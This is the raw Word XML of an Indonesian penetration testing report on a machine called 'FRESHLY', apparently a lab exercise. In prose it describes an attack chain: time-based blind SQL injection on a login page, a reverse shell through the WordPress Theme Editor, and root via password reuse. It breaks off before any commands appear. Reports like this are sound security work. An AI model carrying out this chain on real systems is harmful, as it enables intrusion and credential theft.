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5679" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="736F4063" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E060D67" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="193CF094" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51E60E2B" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:color w:val="auto"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="auto"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Laporan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BA6E80" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Penetration</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
        <w:t>Testing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682DE709" w14:textId="43657F03" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Mesin :</w:t>
      </w:r>
      <w:r w:rsidR="00A06C75">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00890951">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>FRESHLY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44052980" w14:textId="1A84D87E" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Disusun oleh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E12335">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Hanif Nur Hidayat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1515ED31" w14:textId="34BA3F55" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Tanggal pengujian</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00A92610">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00890951">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t xml:space="preserve">Februari </w:t>
      </w:r>
      <w:r w:rsidR="00E12335">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>202</w:t>
      </w:r>
      <w:r w:rsidR="003A2D6F">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0539348A" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EA14D66" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D2335E6" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AD76524" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="544FCC7A" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14643938" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63F3C51A" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19DD5349" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AD0CD04" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="175606D2" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A505D23" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5811E00E" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40CD58D8" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20D6358E" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54D14F51" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Ringkasan Eksekutif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101CA8E9" w14:textId="77777777" w:rsidR="00850F79" w:rsidRPr="00850F79" w:rsidRDefault="006B5C48" w:rsidP="00850F79">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
          <w:sz w:val="24"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
          <w:sz w:val="24"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:tab/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Dilaksanakan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kegiatan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uji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penetrasi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dengan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target pada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alamat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IP 192.168.95.28.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Setelah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melakukan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scanning dan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enumerasi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,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didapati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bahwa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sistem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memiliki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Port 80 (HTTP) yang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menjalankan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layanan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web. Hasil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kegiatan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menunjukkan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bahwa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sistem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rentan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terhadap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serangan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SQL Injection (Time-Based Blind) pada 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halaman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login (/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart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login.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00850F79"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).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3688BA34" w14:textId="77777777" w:rsidR="00850F79" w:rsidRPr="00850F79" w:rsidRDefault="00850F79" w:rsidP="00850F79">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A41E629" w14:textId="079BB8EA" w:rsidR="001E6B5C" w:rsidRDefault="00850F79" w:rsidP="00850F79">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
          <w:sz w:val="24"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pP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Kerentanan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ini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memungkinkan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penyerang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untuk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mengekstrak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informasi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sensitif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dari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basis data,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termasuk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kredensial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administrator.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Dengan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kredensial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tersebut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,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penyerang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berhasil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masuk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panel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administrasi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WordPress dan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mengeksploitasi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fitur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Theme Editor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untuk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mengunggah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Reverse Shell, yang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mengarah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pada Remote Code Execution (RCE).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Penyerang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akhirnya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berhasil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mendapatkan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akses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penuh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(root)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dalam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server. Oleh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karena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itu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,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laporan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ini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disusun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untuk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memberikan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informasi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kepada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pemilik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sistem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agar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segera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menindaklanjuti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celah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keamanan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 xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart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tersebut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00850F79">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C14D356" w14:textId="7038B342" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Ruang Lingkup Pengujian</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FC6C2D" w14:textId="431F7181" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t xml:space="preserve">Pengujian dilakukan terhadap jaringan dengan range IP </w:t>
      </w:r>
      <w:r w:rsidR="00C9506D">
        <w:t>192.168.</w:t>
      </w:r>
      <w:r w:rsidR="00046C70">
        <w:t>93.</w:t>
      </w:r>
      <w:r w:rsidR="00C9506D">
        <w:t>0/24</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t xml:space="preserve">, dengan ditemukan </w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t xml:space="preserve"> sistem sebagai berikut : </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="PlainTable21"/>
        <w:tblW w:w="9372" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="835"/>
        <w:gridCol w:w="2426"/>
        <w:gridCol w:w="6111"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E4349" w14:paraId="60A152B1" w14:textId="77777777" w:rsidTr="004E4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vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="3FCEBD55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rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/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No</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2426" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="79424E8D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Alamat IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6111" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="7FCC6DE8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Port yang terbuka</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E4349" w14:paraId="4701B013" w14:textId="77777777" w:rsidTr="004E4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bottom"/>
          </w:tcPr>
          <w:p w14:paraId="27EE426B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rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/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1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="242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bottom"/>
          </w:tcPr>
          <w:p w14:paraId="7A76CED8" w14:textId="5744EB87" w:rsidR="004E4349" w:rsidRDefault="00E778A8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highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="id-ID"/>
              </w:rPr>
              <w:t>192.168.9</w:t>
            </w:r>
            <w:r w:rsidR="00850F79">
              <w:rPr>
                <w:lang w:val="id-ID"/>
              </w:rPr>
              <w:t>5.28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="611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bottom"/>
          </w:tcPr>
          <w:p w14:paraId="3AEA3BB7" w14:textId="0BAAE4CC" w:rsidR="004E4349" w:rsidRDefault="00850F79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highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>80, 443, 8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26CCA584" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13F67FEA" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Temuan Kerentanan dan Dampak</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="PlainTable21"/>
        <w:tblW w:w="9498" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="570"/>
        <w:gridCol w:w="1751"/>
        <w:gridCol w:w="2645"/>
        <w:gridCol w:w="1832"/>
        <w:gridCol w:w="2700"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E4349" w14:paraId="46C8E13D" w14:textId="77777777" w:rsidTr="00140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vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="7295E801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rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="id-ID"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:lang w:val="id-ID"/>
              </w:rPr>
              <w:t>No</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1751" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="7BF270CF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Alamat IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2645" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="1EDEBE8C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Kerentanan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1832" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="6240B263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Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2700" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w14:paraId="67085C46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Dampak</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E4349" w14:paraId="735B67C4" w14:textId="77777777" w:rsidTr="00140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375CC03" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/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75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9204350" w14:textId="278F4808" w:rsidR="004E4349" w:rsidRDefault="00E778A8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id-ID"/>
              </w:rPr>
              <w:t>192.168.9</w:t>
            </w:r>
            <w:r w:rsidR="00850F79">
              <w:rPr>
                <w:lang w:val="id-ID"/>
              </w:rPr>
              <w:t>5.28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="264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5C3450D" w14:textId="199E4514" w:rsidR="004E4349" w:rsidRPr="00A71006" w:rsidRDefault="00A71006" w:rsidP="009558A0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1006">
              <w:t>SQL Injection (Time-Based Blind) pada Login Form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F3D00A2" w14:textId="34AE9B8C" w:rsidR="004E4349" w:rsidRDefault="001E6B5C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Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="270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24DF276" w14:textId="706345AF" w:rsidR="004E434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71006">
              <w:t>Pencurian</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00A71006">
              <w:t xml:space="preserve"> data </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00A71006">
              <w:t>kredensial</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00850F79" w14:paraId="6239D133" w14:textId="77777777" w:rsidTr="00140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CFA85A2" w14:textId="5F1B703C" w:rsidR="00850F79" w:rsidRDefault="00850F79">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0"/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1E56ACD" w14:textId="6B8D24FB" w:rsidR="00850F7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192.168.95.28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="264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93EF0DE" w14:textId="6747DFCA" w:rsidR="00850F79" w:rsidRPr="00A71006" w:rsidRDefault="00A71006" w:rsidP="00A71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1006">
              <w:t>Remote Code</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00A71006">
              <w:t>Execution (RCE) via</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00A71006">
              <w:t>WordPress Theme</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> E</w:t>
            </w:r>
            <w:r w:rsidRPr="00A71006">
              <w:t>ditor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7EAB6FE7" w14:textId="0C9782DE" w:rsidR="00850F79" w:rsidRPr="00A71006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A71006">
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="270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1F0E97B" w14:textId="13EA23C0" w:rsidR="00850F7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Pengambilalihan akses shell</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00850F79" w14:paraId="5C543256" w14:textId="77777777" w:rsidTr="00140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4BF88FA" w14:textId="3AAD9E6A" w:rsidR="00850F79" w:rsidRDefault="00850F79">
            <w:pPr>
              <w:pStyle w:val="ListParagraph"/>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="0"/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75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2F6943E" w14:textId="20D0A6F0" w:rsidR="00850F7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192.168.95.28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="264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8A1FBEC" w14:textId="39A3CA39" w:rsidR="00850F79" w:rsidRPr="00A71006" w:rsidRDefault="00A71006" w:rsidP="00A71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1006">
              <w:t>Weak Privilege</w:t>
            </w:r>
            <w:r w:rsidRPr="00A71006">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00A71006">
              <w:t>Configuration (Reuse Password)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1832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94A47B3" w14:textId="2F68F09E" w:rsidR="00850F7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A71006">
              <w:rPr>
                <w:lang w:val="id-ID"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="270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1AD9C5B" w14:textId="6B3CE4AE" w:rsidR="00850F79" w:rsidRDefault="00A71006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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00A71006">
              <w:t>Eskalasi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00A71006">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00A71006">
              <w:t>hak</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00A71006">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00A71006">
              <w:t>akses</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00A71006">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00A71006">
              <w:t>menjadi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00A71006">
              <w:t xml:space="preserve"> Root</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2633D9F4" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Proof-Of-Concept</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3D2388" w14:textId="61FB7A89" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Target 1 (</w:t>
      </w:r>
      <w:r w:rsidR="00E778A8">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>192.168.9</w:t>
      </w:r>
      <w:r w:rsidR="00850F79">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00E778A8">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00850F79">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="00E778A8">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C819AC" w14:textId="3E8297E6" w:rsidR="009F28E3" w:rsidRPr="009F28E3" w:rsidRDefault="00F02CC7" w:rsidP="009F28E3">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Information Gathering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F27B55E" w14:textId="3D5F4211" w:rsidR="004E4349" w:rsidRDefault="009F28E3" w:rsidP="00326575">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00EF70B2">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
